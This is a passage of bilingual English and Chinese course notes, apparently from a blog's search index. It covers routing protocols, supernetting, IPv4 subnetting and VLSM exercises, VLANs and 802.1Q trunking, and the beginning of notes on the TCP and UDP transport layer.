systems</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Routing tables</li>\n</ol>\n<ul>\n<li>Routing table—A database that maintains information about where hosts are located and the most efficient route to reach them\n<ul>\n<li>Routers rely on them to identify which router is the next hop to reach a particular destination host</li>\n</ul>\n</li>\n<li>Routing tables contain IP addresses and network masks\n<ul>\n<li>A network mask identifies a network that a host or another router belongs to</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Static Routing vs Dynamic Routing</li>\n</ol>\n<ul>\n<li>Static routing—Network administrators configure a routing table to direct messages along specific paths\n<ul>\n<li>Example—A static route between a small business and its ISP</li>\n</ul>\n</li>\n<li>Dynamic routing—Automatically calculates the best path between two networks and maintains this information in a routing table\n<ul>\n<li>A router can detect problems with failed or congested routes and reroute messages through a different path</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>Routing metrics<br>\nRouting metrics—Properties of a route used by routers to determine the best path to a destination:</li>\n</ol>\n<ul>\n<li>Hop count</li>\n<li>Theoretical bandwidth and actual throughput</li>\n<li>Delay, or latency, on a potential path</li>\n<li>Load, or the traffic or processing burden</li>\n<li>MTU (maximum transmission unit) or the largest I P packet size in bytes allowable without fragmentation</li>\n<li>Routing cost, or a value assigned to a particular route</li>\n<li>Reliability of a potential path</li>\n<li>Topology of a network</li>\n</ul>\n<ol start=\"5\">\n<li>Determining the Best Routing Paths</li>\n</ol>\n<ul>\n<li>Routing protocols—Used by routers to communicate with each other to determine the best path</li>\n<li>Routers rate the reliability and priority of a routing protocol’s data based on these criteria:\n<ul>\n<li>Administrative distance (AD)—A number indicating the protocol’s reliability</li>\n<li>Convergence time—Time it takes to recognize a best path in the event of a change or network outage</li>\n<li>Overhead—The burden placed on the underlying network to support the protocol</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Routing protocols\" class=\"active\"><a class=\"anchor\"  href=\"#Routing protocols\">#</a>Routing protocols</h1>\n<table>\n<thead>\n<tr>\n<th>Routing Protocol</th>\n<th>Type</th>\n<th>Algorithm Used</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>RIP (Routing Information Protocol)</td>\n<td>IGP</td>\n<td>Distance-vector</td>\n</tr>\n<tr>\n<td>RIPv2 (Routing Information Protocol, version 2)</td>\n<td>IGP</td>\n<td>Distance-vector</td>\n</tr>\n<tr>\n<td>OSPF (Open Shortest Path First)</td>\n<td>IGP</td>\n<td>Link-state</td>\n</tr>\n<tr>\n<td>IS-IS (Intermediate System to Intermediate System)</td>\n<td>IGP</td>\n<td>Link-state</td>\n</tr>\n<tr>\n<td>EIGRP (Enhanced Interior Gateway Routing Protocol)</td>\n<td>IGP</td>\n<td>Advanced distance-vector</td>\n</tr>\n<tr>\n<td>BGP (Border Gateway Protocol)</td>\n<td>EGP</td>\n<td>Advanced distance-vector or path vector</td>\n</tr>\n</tbody>\n</table>\n<p><img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/12b43b341ed2ece0.png\" alt=\"img\"></p>\n<ol>\n<li>IGP and EGP</li>\n</ol>\n<ul>\n<li>IGP (interior gateway protocols)— in core routers and edge routers within autonomous systems, often grouped according to the algorithms they use to calculate best paths:\n<ul>\n<li>Distance-vector routing protocols—Calculate path on the basis of the distance to that destination</li>\n<li>Link-state routing protocols—Enables routers to communicate beyond neighboring routers in order to independently map the network and determine the best path</li>\n</ul>\n</li>\n<li>EGP (exterior gateway protocols)— in edge routers and exterior routers to distribute data outside of autonomous systems\n<ul>\n<li>The only EGP currently in use is BGP</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>BGP (Border Gateway Protocol) – Protocol of the Internet</li>\n</ol>\n<ul>\n<li>BGP is the only EGP in use at the moment. It can span multiple autonomous systems</li>\n<li>A path-vector routing protocol that communicates via BGP-specific messages that travel between routers</li>\n<li>Determines the best paths based on many different factors</li>\n<li>Can be configured to follow policies that might avoid a certain router or instruct a group of routers to prefer a particular route</li>\n<li>The most complex of the routing protocols</li>\n</ul>\n<ol start=\"3\">\n<li>OSPF（开放最短路径优先协议）<br>\nOSPF（Open Shortest Path First） 是一种内部网关协议（IGP）和链路状态路由协议，通常用于内部和边缘路由器。它被设计为对早期的 RIP（路由信息协议） 的改进。</li>\n</ol>\n<ul>\n<li>支持大型网络：OSPF 没有跳数限制，因此可以支持更大的网络规模，而不像 RIP 那样限制为 15 跳。</li>\n<li>复杂的路径计算算法：OSPF 使用更复杂的算法（Dijkstra 算法）来计算最佳路径，基于链路状态和网络拓扑实现高效路由选择。</li>\n<li>共享数据：OSPF 维护一个链路状态数据库，包含其他路由器的链路信息，使每个路由器可以掌握网络的全局视图，从而选择最佳路径。</li>\n<li>低开销，快速收敛：OSPF 要求更高的内存和 CPU 来执行计算，但它占用的网络带宽较少，并且在网络发生变化时可以快速收敛，提供稳定的路由信息。</li>\n<li>稳定性：OSPF 使用防止路由环路的算法，确保路由信息的稳定性和可靠性。OSPF 使用触发更新机制，仅在网络拓扑发生变化时更新，而不是定期更新，减少了不必要的路由信息传输</li>\n<li>多供应商支持：OSPF 是一种标准协议，所有现代路由器都支持，因此可以在不同品牌和供应商的路由器之间实现互操作。</li>\n<li>创建链路状态表的正确步骤顺序：\n<ul>\n<li>Send a “Hello” packet to directly connected neighbouring routers<br>\nOSPF 首先通过发送 “Hello” 数据包来发现直接相连的邻居路由器，确认哪些路由器是直接连接的邻居。</li>\n<li>Build Link State Packets out of a list of the router’s neighbours<br>\n 收集到邻居信息后，路由器构建包含所有邻居列表的链路状态数据包（Link State Packet，LSP）。</li>\n<li>Send a Link State Packet to every one of its neighbours<br>\n 路由器将构建好的链路状态数据包发送给所有邻居，以便邻居可以更新其链路状态表。</li>\n<li>Build a network topology based on the information it has received from its neighbours<br>\n 最后，路由器基于从邻居接收到的链路状态信息，构建出整个网络的拓扑图，选择最佳路径。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>I S-IS (Intermediate System to Intermediate System)</li>\n</ol>\n<ul>\n<li>IS-IS is an IGP and link-state routing protocol:</li>\n<li>Uses a best-path algorithm similar to OSPF</li>\n<li>Is designed for use <strong>on core</strong> routers only (unlike OSPF)</li>\n<li>Not handcuffed to IPv4 (like OSPF) so it’s easy to adapt to <strong>IPv6</strong></li>\n<li>Service providers generally prefer IS-IS because it is more <strong>scalable</strong> than OSPF</li>\n</ul>\n<ol start=\"5\">\n<li>EIGRP (Enhanced Interior Gateway Routing Protocol)</li>\n</ol>\n<ul>\n<li>EIGRP is an advanced distance-vector protocol that combines some of the features of a link-state protocol</li>\n<li>Often referred to as a hybrid protocol</li>\n<li>Fast convergence time and low network overhead</li>\n<li>Easier to configure and less CPU-intensive than OSPF</li>\n<li>Supports multiple protocols and limits unnecessary network traffic between routers</li>\n<li>Originally proprietary to Cisco routers<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/4ab0d24b662cde26.png\" alt=\"img\"></li>\n</ul>\n<h1 id=\"Supernetting\" class=\"active\"><a class=\"anchor\"  href=\"#Supernetting\">#</a>IPv4 Supernetting</h1>\n<ol>\n<li>Supernetting</li>\n</ol>\n<ul>\n<li>It is also called Network Summarisation\n<ul>\n<li>To combine a group of continuous subnets to form a single network</li>\n</ul>\n</li>\n<li>It is used for route aggregation to reduce the size of routing tables\n<ul>\n<li>A way of reducing the number of routes in the routing table</li>\n<li>To consolidate continuous routes into a single route for route advertisement</li>\n</ul>\n</li>\n<li>Benefits of Superneting\n<ul>\n<li>To minimize the latency in a complex network structure</li>\n<li>To reduce the overhead for routing process, since the reduced number of route entries in the routing table</li>\n<li>To improve network stability by reducing or eliminating unnecessary routing updates after part of the network undergoes a change in topology</li>\n<li>To reduce processor workloads, memory requirements and bandwidth demand</li>\n</ul>\n</li>\n<li>示例：一个中型组织需要 1,000 个地址。需要多少个 Class C 地址？子网掩码是多少？\n<ul>\n<li>计算需要的 Class C 地址数量：每个 Class C 地址可以提供 254 个主机地址（即每个子网最多支持 254 个主机）。因此，1,000 个地址需要至少 4 个 Class C 网络地址来满足（4 个 Class C 网络共提供 4 × 254 = 1,016 个地址）。</li>\n<li>超网分配和地址汇总：通常情况下，1,000 个地址会需要一个 Class B 网络，但通过使用 4 个连续的 Class C 地址并将其超网，可以合并为一个网络地址来访问整个组织。通过将 4 个连续的 Class C 网络地址汇总为一个超网，这个组织可以通过一个单一的网络地址进行访问。</li>\n<li>子网掩码计算：4 个 Class C 网络 = 2**2，因此在第三个八位组（即第三个字节）中借用了 2 位作为网络部分。超网掩码为：11111111.11111111.11111100.00000000，即 255.255.252.0 或 /22。</li>\n</ul>\n</li>\n</ul>\n","categories":["课程笔记","Network Systems"],"tags":["network system","router","Supernet"]},{"title":"Layer 3 - Subnetting and VLANs","url":"/course/Layer-3-Subnetting-and-VLANs/","content":"<h1 id=\"IPv4 Subnetting\" class=\"active\"><a class=\"anchor\"  href=\"#IPv4 Subnetting\">#</a>IPv4 Subnetting</h1>\n<ol>\n<li>为什么需要子网划分（Subnetting）</li>\n</ol>\n<ul>\n<li>\n<p>在仅有一个 IP 地址范围的情况下，需要将其用于多个局域网（LAN）。将网络划分为更小的子网：将一个大的网络地址范围拆分为多个小的子网络（子网）。子网划分可以帮助组织多个楼层、部门或区域的网络结构，使其更易于管理。</p>\n</li>\n<li>\n<p>原始结构：一个 LAN 网络中包含一个网络 ID 和主机 ID。</p>\n</li>\n<li>\n<p>划分后：在网络 ID 和主机 ID 之间插入一个子网 ID，使一个大的 IP 地址范围被拆分为多个小子网。子网划分后，每个楼层（或区域）可以拥有自己的子网，使用同一个网络 ID，但子网 ID 不同。最终效果是一个大的网络地址被分割成多个小的子网络，以满足不同区域的需求，并实现更高效的流量管理和网络隔离。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/a479a9a1e392e680.png\" alt=\"subnetting\"></p>\n</li>\n<li>\n<p>减少和管理广播域：网络分段限制了广播的范围，每个子网都具有独立的广播域，从而减少了广播流量。</p>\n</li>\n<li>\n<p>减少网络拥堵：将设备分配到不同的子网中，减少了每个子网中的设备数量，从而降低了网络拥堵的风险。</p>\n</li>\n<li>\n<p>限制广播：广播只会在各自的子网中进行，避免了不必要的广播流量传播到整个网络中。</p>\n</li>\n<li>\n<p>逻辑子网划分：根据部门或使用者类型（如员工 / 访客）划分子网，以便于管理和控制访问权限。</p>\n</li>\n<li>\n<p>支持不同的网络技术：不同的子网可以支持不同的网络技术（如 Ethernet、FDDI），实现技术兼容。</p>\n</li>\n<li>\n<p>支持广域网（WAN）连接：通过使用一个网络 ID（如 131.181.0.0/16）将地理位置分散的局域网 (LAN) 连接在一起，例如可以划分为 131.181.0.0/24、131.181.1.0/24 等子网</p>\n</li>\n</ul>\n<ol start=\"2\">\n<li>网络分段的常见方式</li>\n</ol>\n<ul>\n<li>网络通常根据以下类别进行分段，以便更好地管理和控制流量：\n<ul>\n<li>地理位置：按照物理位置（如楼层、建筑）对网络进行分段，使每个区域具有独立的广播域。</li>\n<li>部门边界：按照组织的部门（如财务部、技术部）划分子网，以确保各部门的流量和资源分开。</li>\n<li>设备类型：按照设备的类型（如电脑、打印机、服务器）进行分段，便于应用不同的安全策略和流量管理。</li>\n</ul>\n</li>\n<li>网络分段示例<br>\n假设一个企业从原有的 20 到 30 台计算机扩展到几百台设备，并且只有一个广播域（LAN）和一个默认路由器。可以通过以下方式优化网络：\n<ul>\n<li>为每个楼层划分一个子网：在每个楼层安装一个路由器，以便每个楼层都有自己的 LAN 或广播域。</li>\n<li>配置子网客户端：将 IP 地址池划分为多个子网，并为每个子网分配独立的 IP 地址范围（即子网划分技术），以便客户端知道自己所在的子网内有哪些设备</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>如何识别网络和子网络</li>\n</ol>\n<ul>\n<li>在 IP 地址结构中，IP 地址分为两个部分：\n<ul>\n<li>网络 ID：标识 IP 地址所在的网络。</li>\n<li>主机 ID：标识网络中的具体主机或设备。</li>\n</ul>\n</li>\n<li>子网划分（Subnetting）\n<ul>\n<li>为了实现子网划分，我们可以借用一些主机 ID 位来表示子网络（子网），从而进一步细分网络 ID 部分。这样可以将一个大型网络划分成多个子网络，以便于更高效的管理和控制。</li>\n</ul>\n</li>\n<li>如何识别网络 ID 和子网 ID：\n<ul>\n<li>使用子网掩码来指示 IP 地址的哪一部分代表网络（包括子网络），哪一部分代表主机。</li>\n</ul>\n</li>\n<li>Example\n<ul>\n<li>IP address 192.168.123.132 in binary: 11000000.10101000.01111011.10000100 (Class C)</li>\n<li>Subnet mask 255.255.255.0 in binary: 11111111.111111111.111111111.00000000</li>\n<li>Network I D: 192.168.123.0</li>\n<li>Host portion: 0.0.0.132</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>地址结构 – 从两级到三级的子网划分<br>\n子网划分通过在主机 ID 中进一步划分子网 ID，实现了 IP 地址结构从两级到三级的转变。</li>\n</ol>\n<ul>\n<li>\n<p>示例：将子网掩码 255.255.255.0 应用于 B 类地址<br>\n对于一个默认的 B 类地址，网络 ID 部分通常为前 16 位，主机 ID 部分为后 16 位。<br>\n应用子网掩码 255.255.255.0 后，B 类地址的 16 位主机 ID 被划分为 8 位的子网 ID 和 8 位的主机 ID。</p>\n</li>\n<li>\n<p>结果是一个三级结构：</p>\n<ul>\n<li>网络 ID：前 16 位，用于标识外部网络。</li>\n<li>子网 ID：接下来的 8 位，用于标识内部子网。</li>\n<li>主机 ID：最后的 8 位，用于标识子网中的具体主机。</li>\n</ul>\n</li>\n<li>\n<p>子网划分的特点<br>\n外部网络不可见性：外部网络（如互联网）无法看到子网和主机 ID 的具体结构，只识别到整个网络。<br>\n灵活的子网 / 主机 ID 边界：用户可以根据需求定义子网和主机 ID 的边界，以满足不同规模的网络需求。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/31ea5d544d94cd40.png\" alt=\"subnetting\"><br>\n 给定的 IP 地址为 193.2.1.0，需要将其划分为 4 个子网。我们来回答以下问题：</p>\n</li>\n<li>\n<p>该地址的类别：<br>\n类别：C 类地址<br>\n分析：根据 193 的二进制表示 11000001，第一个字节的前 3 位是 110，所以这是一个 C 类地址。</p>\n</li>\n<li>\n<p>子网掩码：<br>\n原始 C 类地址的默认子网掩码是 255.255.255.0。<br>\n要划分为 4 个子网，我们需要从主机 ID 部分借用 2 位，将子网掩码改为 255.255.255.192（即 11111111.11111111.11111111.11000000）。</p>\n</li>\n<li>\n<p>子网地址：<br>\n通过借用 2 位主机位，可以得到 4 个子网，地址范围如下：<br>\n子网 1：193.2.1.0 到 193.2.1.63  主机 00xxxxxx<br>\n 子网 2：193.2.1.64 到 193.2.1.127  主机 01xxxxxx<br>\n 子网 3：193.2.1.128 到 193.2.1.191 主机 10xxxxxx<br>\n 子网 4：193.2.1.192 到 193.2.1.254  主机 11xxxxxx<br>\n 每个子网中的有效 IP 地址数量：</p>\n</li>\n<li>\n<p>每个子网有 64 个地址，其中第一个地址为网络地址，最后一个地址为广播地址。<br>\n有效 IP 地址数量：每个子网有 62 个可用 IP 地址（64 - 2 = 62）。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/8fd2cfbb0424ec84.png\" alt=\"subnetting\"><br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/b0bb30ef75cdd4f7.png\" alt=\"subnetting\"><br>\nSubnet broadcasts are used to send packets to all hosts within the subnet</p>\n</li>\n</ul>\n<ol start=\"5\">\n<li>\n<p>Exercise<br>\nYour ISP has been allocated a block of address 193.64.33.0/24. Your organization needs to have 8 subnets for its structure. Figure out: 1) the subnet mask, 2) The 8 subnets; 3) the host range in each subnet</p>\n<ol>\n<li>确定子网掩码</li>\n</ol>\n<ul>\n<li>/24 表示默认子网掩码为 255.255.255.0，即主机部分有 8 位。</li>\n<li>为了划分出 8 个子网，需要借用 3 位（因为 2**3 = 8 个子网）。</li>\n<li>新的子网掩码为 /27（即 24 + 3 = 27），对应的子网掩码是 255.255.255.224。</li>\n</ul>\n<ol start=\"2\">\n<li>划分出 8 个子网<br>\n借用 3 位后，每个子网有 2**5=32 个地址（其中包含网络地址和广播地址）。因此，每个子网的间隔为 32。</li>\n</ol>\n</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>子网编号</th>\n<th>网络地址</th>\n<th>子网范围</th>\n<th>广播地址</th>\n<th>有效 IP 地址范围</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>子网 1</td>\n<td>193.64.33.0/27</td>\n<td>193.64.33.0 - 193.64.33.31</td>\n<td>193.64.33.31</td>\n<td>193.64.33.1 - 193.64.33.30</td>\n</tr>\n<tr>\n<td>子网 2</td>\n<td>193.64.33.32/27</td>\n<td>193.64.33.32 - 193.64.33.63</td>\n<td>193.64.33.63</td>\n<td>193.64.33.33 - 193.64.33.62</td>\n</tr>\n<tr>\n<td>子网 3</td>\n<td>193.64.33.64/27</td>\n<td>193.64.33.64 - 193.64.33.95</td>\n<td>193.64.33.95</td>\n<td>193.64.33.65 - 193.64.33.94</td>\n</tr>\n<tr>\n<td>子网 4</td>\n<td>193.64.33.96/27</td>\n<td>193.64.33.96 - 193.64.33.127</td>\n<td>193.64.33.127</td>\n<td>193.64.33.97 - 193.64.33.126</td>\n</tr>\n<tr>\n<td>子网 5</td>\n<td>193.64.33.128/27</td>\n<td>193.64.33.128 - 193.64.33.159</td>\n<td>193.64.33.159</td>\n<td>193.64.33.129 - 193.64.33.158</td>\n</tr>\n<tr>\n<td>子网 6</td>\n<td>193.64.33.160/27</td>\n<td>193.64.33.160 - 193.64.33.191</td>\n<td>193.64.33.191</td>\n<td>193.64.33.161 - 193.64.33.190</td>\n</tr>\n<tr>\n<td>子网 7</td>\n<td>193.64.33.192/27</td>\n<td>193.64.33.192 - 193.64.33.223</td>\n<td>193.64.33.223</td>\n<td>193.64.33.193 - 193.64.33.222</td>\n</tr>\n<tr>\n<td>子网 8</td>\n<td>193.64.33.224/27</td>\n<td>193.64.33.224 - 193.64.33.255</td>\n<td>193.64.33.255</td>\n<td>193.64.33.225 - 193.64.33.254</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"6\">\n<li>VLSM（可变长子网掩码<br>\n VLSM（Variable Length Subnetting） 是一种允许使用不同长度子网掩码进行子网划分的技术。通过 VLSM，我们可以为具有不同主机数量需求的子网分配不同大小的子网掩码，最大限度地优化 IP 地址的使用。</li>\n</ol>\n<ul>\n<li>假设我们有一个 C 类地址 212.5.5.0，需求是：\n<ul>\n<li>3 个子网需要支持 60 个主机</li>\n<li>2 个子网需要支持 30 个主机</li>\n</ul>\n<ol>\n<li>初步子网划分</li>\n</ol>\n<ul>\n<li>借用 2 位子网位：默认 C 类地址 /24 有 8 位主机位。</li>\n<li>借用 2 位主机位用于子网划分，得到 4 个子网，每个子网可以容纳约 60 个主机（6 位主机位，即 2**6-2=62 个主机）。</li>\n<li>子网掩码变为 255.255.255.192，即 /26。</li>\n<li>子网划分（每个子网有 62 个有效主机地址）：\n<ul>\n<li>子网 1：212.5.5.0/26，IP 范围 212.5.5.1 - 212.5.5.62，广播地址 212.5.5.63</li>\n<li>子网 2：212.5.5.64/26，IP 范围 212.5.5.65 - 212.5.5.126，广播地址 212.5.5.127</li>\n<li>子网 3：212.5.5.128/26，IP 范围 212.5.5.129 - 212.5.5.190，广播地址 212.5.5.191</li>\n<li>子网 4：212.5.5.192/26，IP 范围 212.5.5.193 - 212.5.5.254，广播地址 212.5.5.255</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>进一步子网划分</li>\n</ol>\n<ul>\n<li>现在，需要将其中一个子网进一步划分，以满足 30 个主机的需求。进一步借用 1 位主机位：</li>\n<li>选择其中一个子网（例如 212.5.5.192/26），再借用 1 位。借用后，我们可以将该子网划分为两个更小的子网，每个子网有 30 个有效主机地址（5 位主机位，即 2**5−2=30 个主机）。</li>\n<li>子网掩码变为 255.255.255.224，即 /27。</li>\n<li>新划分的子网（每个子网有 30 个有效主机地址）：\n<ul>\n<li>子网 4.1：212.5.5.192/27，IP 范围 212.5.5.193 - 212.5.5.222，广播地址 212.5.5.223</li>\n<li>子网 4.2：212.5.5.224/27，IP 范围 212.5.5.225 - 212.5.5.254，广播地址 212.5.5.255</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"VLANs\" class=\"active\"><a class=\"anchor\"  href=\"#VLANs\">#</a>VLANs</h1>\n<ol>\n<li>VLAN（虚拟局域网）是一种通过将交换机上的端口分组的技术，使本地流量在交换机上被强制通过路由器，从而有效地控制和隔离网络流量。它将一个物理局域网划分为多个逻辑局域网，以减少广播流量和提升网络性能。</li>\n</ol>\n<ul>\n<li>VLAN 的作用\n<ul>\n<li>限制广播域范围：VLAN 可以将交换机上的端口分组，形成多个逻辑分离的子网。这样，每个 VLAN 成为一个单独的广播域，限制了广播流量的传播范围。</li>\n<li>提升网络安全性：不同 VLAN 之间的通信需要通过路由器（或三层交换机），可以对不同 VLAN 之间的流量进行监控和管理，提升网络安全性。</li>\n<li>灵活的网络管理：VLAN 使得网络管理更加灵活，可以根据部门、楼层或设备类型分配 VLAN，而不必受物理位置限制。</li>\n</ul>\n</li>\n<li>示例： 假设有一个交换机有 24 个端口，可以将端口 1-12 分配到 VLAN 1，端口 13-24 分配到 VLAN 2。VLAN 1 和 VLAN 2 的设备互不通信，除非通过路由器连接，从而形成两个隔离的网络。</li>\n<li>使用 VLAN（虚拟局域网） 的主要原因包括以下几个方面：\n<ul>\n<li>隔离高流量或不稳定流量的连接：对于那些产生大量数据或流量模式不可预测的设备，使用 VLAN 可以将其流量隔离开，以免影响其他网络设备。</li>\n<li>识别需要优先处理数据的设备组：VLAN 可以用于标识和分组需要优先级的数据流（如视频会议、语音数据等），以便在网络中给予更高的处理优先级。</li>\n<li>包含依赖于传统协议的设备：一些设备可能使用与网络主流协议不兼容的旧协议。将这些设备放在独立的 VLAN 中可以避免协议冲突，并确保它们在网络中正常工作。</li>\n<li>分离需要特殊安全或网络功能的用户组：某些用户或部门可能需要特定的安全设置或网络功能（如财务部门、IT 部门等），可以通过 VLAN 实现隔离和特殊配置。</li>\n<li>配置临时网络：在公司活动或项目期间，可能需要临时的网络环境，VLAN 提供了一种方便的方式来创建和管理临时网络。</li>\n<li>减少网络设备的成本：VLAN 可以在同一物理网络设备上实现逻辑分割，减少了物理交换机和路由器的需求，从而降低设备成本。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Managed switch:</li>\n</ol>\n<ul>\n<li>非管理型交换机：\n<ul>\n<li>提供即插即用的简单操作，几乎不需要配置。</li>\n<li>没有分配 IP 地址，因此无法远程管理。</li>\n</ul>\n</li>\n<li>管理型交换机：\n<ul>\n<li>允许通过命令行界面或基于网页的管理 GUI 进行配置。</li>\n<li>通常分配有 IP 地址，支持远程管理。</li>\n<li>VLAN 只能通过管理型交换机来实现，用于逻辑分割网络以提高安全性和网络性能。</li>\n<li>可以将端口划分成不同的组，以便控制不同的流量和访问。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>802.1Q: 管理型交换机中的 VLAN 标签标准</li>\n</ol>\n<ul>\n<li>802.1Q 是 IEEE 制定的标准，规定了在以太网帧中添加 VLAN 信息的方式，以及交换机如何解读这些信息。这个标准广泛应用于 VLAN 实现。</li>\n<li>主要功能\n<ul>\n<li>识别属于各个 VLAN 的传输：交换机在到达交换机的以太网帧中添加一个标签（Tag），用于标识该帧来自的端口以及其所属的 VLAN。该标签会一直伴随传输，直到到达路由器或目标设备连接的交换机端口。</li>\n<li>标签的传递和移除：\n<ul>\n<li>如果帧被路由到一个新的 VLAN：路由器会添加一个新的标签来标识帧的新 VLAN。</li>\n<li>标签的移除：当帧到达其最终的交换机端口（连接到目的设备的端口）时，标签会被移除。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/eb628ecdefc24129.png\" alt=\"image\"></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>交换机端口和中继（Trunks）<br>\n在交换机上，端口可以配置为 接入端口（Access Port） 或 中继端口（Trunk Port）：</li>\n</ol>\n<ul>\n<li>接入端口（Access Port）：\n<ul>\n<li>用于连接单个节点或设备。</li>\n<li>典型的应用场景是连接计算机、打印机等设备到交换机。</li>\n<li>每个接入端口通常只属于一个 VLAN，用于接收和发送该 VLAN 的流量。</li>\n</ul>\n</li>\n<li>中继端口（Trunk Port）：\n<ul>\n<li>能够管理多个 VLAN 之间的流量。</li>\n<li>中继端口用于在交换机之间建立一个物理连接，通过该连接可以传输和接收来自多个 VLAN 的数据。</li>\n<li>中继端口将 VLAN 标签附加到以太网帧中，以确保不同 VLAN 的流量在传输中保持隔离。</li>\n</ul>\n</li>\n<li>中继（Trunk）\n<ul>\n<li>中继 是交换机之间的一个单一物理连接，但可以通过它传输多个逻辑 VLAN 的数据。</li>\n<li>中继协议 负责在以太网帧中分配和解释 VLAN 标签，从而识别属于各个 VLAN 的数据流量</li>\n</ul>\n</li>\n</ul>\n<ol start=\"5\">\n<li>VLAN 和子网的关系</li>\n</ol>\n<ul>\n<li>\n<p>每个 VLAN 都分配有自己的 IP 地址子网。这意味着每个 VLAN 相当于一个独立的网络，具有自己专用的 IP 地址范围。</p>\n</li>\n<li>\n<p>示例网络（图中右下角示意图）展示了一个被划分为三个子网的网络：</p>\n<ul>\n<li>在这个网络中，尽管多个 VLAN 都连接到同一个路由器端口，但路由器可以看到每个 VLAN 作为一个独立的逻辑局域网。</li>\n<li>路由器会根据 VLAN ID 来区分流量，并为每个 VLAN 分配不同的子网进行 IP 地址管理。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/ada329c62764baa3.png\" alt=\"image\"></li>\n</ul>\n</li>\n</ul>\n<ol start=\"6\">\n<li>VLAN 类型</li>\n</ol>\n<ul>\n<li>默认 VLAN（Default VLAN）：\n<ul>\n<li>通常在交换机上预配置的 VLAN，初始状态下包含所有交换机端口。</li>\n<li>默认情况下，所有端口都属于该 VLAN，通常被配置为 VLAN 1。</li>\n</ul>\n</li>\n<li>本地 VLAN（Native VLAN）：\n<ul>\n<li>用于接收所有未打标签的帧（即没有 VLAN 标签的流量）。</li>\n<li>当来自未标记的端口的流量进入中继端口时，本地 VLAN 会接收这些数据。</li>\n</ul>\n</li>\n<li>数据 VLAN（Data VLAN）：\n<ul>\n<li>携带用户生成的流量，例如电子邮件、网页浏览和数据库更新等。</li>\n<li>用于常规用户数据传输，是大部分设备和用户数据所在的 VLAN。</li>\n</ul>\n</li>\n<li>管理 VLAN（Management VLAN）：\n<ul>\n<li>用于提供对交换机的管理访问，允许管理员远程管理和配置交换机。</li>\n<li>通常为管理接口配置单独的 VLAN，以便与数据流量隔离，提高管理的安全性。</li>\n</ul>\n</li>\n<li>语音 VLAN（Voice VLAN）：\n<ul>\n<li>支持 VoIP（语音 IP）流量的 VLAN，用于优化和优先处理语音通信数据。</li>\n<li>语音 VLAN 可以减少延迟和抖动，提供更好的音质体验。</li>\n</ul>\n</li>\n</ul>\n","categories":["课程笔记","Network Systems"],"tags":["network system","IPv4","Subnet"]},{"title":"Layer 4 - Transport Protocols TCP and UDP","url":"/course/Layer-4-Transport-Protocols-TCP-and-UDP/","content":"<h1 id=\"Layer 4\" class=\"active\"><a class=\"anchor\"  href=\"#Layer 4\">#</a>Layer 4</h1>\n<ol>\n<li>\n<p>接收主机的解封装过程与连接设备<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/2e9e1d69eabb58ba.png\" alt=\"img\"></p>\n</li>\n<li>\n<p>Role of Transport Layer</p>\n</li>\n</ol>\n<ul>\n<li>Role: to transport application-layer payloads from one application to another\n<ul>\n<li>Layer 4 establishes end-to-end connectivity</li>\n<li>Recall: Layer 3 performs end-to-end delivery of packets</li>\n</ul>\n</li>\n<li>Two main protocols:\n<ul>\n<li>Transmission Control Protocol (TCP): A connection-oriented protocol designed for reliable transfer of information</li>\n<li>User Datagram Protocol (UDP): A connectionless protocol designed for efficient communication of generally small smounts of data</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Segments and Datagrams</li>\n</ol>\n<ul>\n<li>Transport-layer protocols work with units of data called segments (TCP) or datagrams (UDP)</li>\n<li>Both TCP and UDP add a header to payload. This is known as encapsulation</li>\n<li>The Transport-layer protocol then passes the segment or datagram to the Internetwork protocol (IP)</li>\n<li>With incoming data, the Transport-layer receives the segment or datagram from the Internetwork protocol, processes it, decapsulates it and sends the resulting data up to the Application layer</li>\n</ul>\n<ol start=\"5\">\n<li>Identify Source/Destination Processes/Applications</li>\n</ol>\n<ul>\n<li>A <strong>port number</strong> is a way to identify a specific process/application to which an Internet or other network message is to be forwarded when it arrives at a server.</li>\n<li>For TCP and UDP, a port number is a 16-bit integer that is put in the header appended to a message unit.\n<ul>\n<li>TCP and UDP use port numbers to specify the source and destination Application-layer protocols</li>\n</ul>\n</li>\n</ul>\n<ol start=\"6\">\n<li>Detect Data integrity with a Checksum mechanism</li>\n</ol>\n<ul>\n<li>To protect data integrity, TCP and UDP provide a checksum similar to a cyclic redundancy check (CRC). CRC is an error-detecting code</li>\n<li>Intermediate nodes do NOT recalculate the checksum in the Transport layer. So if data corruption occurs during transmission, the final receiving host detects the checksum error and discards the data</li>\n</ul>\n<h1 id=\"TCP (Transmission Control Protocol)\" class=\"active\"><a class=\"anchor\"  href=\"#TCP (Transmission Control Protocol)\">#</a>TCP (Transmission Control Protocol)</h1>\n<h2 id=\"TCP\" class=\"active\"><a class=\"anchor\"  href=\"#TCP\">#</a>TCP</h2>\n<ol>\n<li>Characteristics of 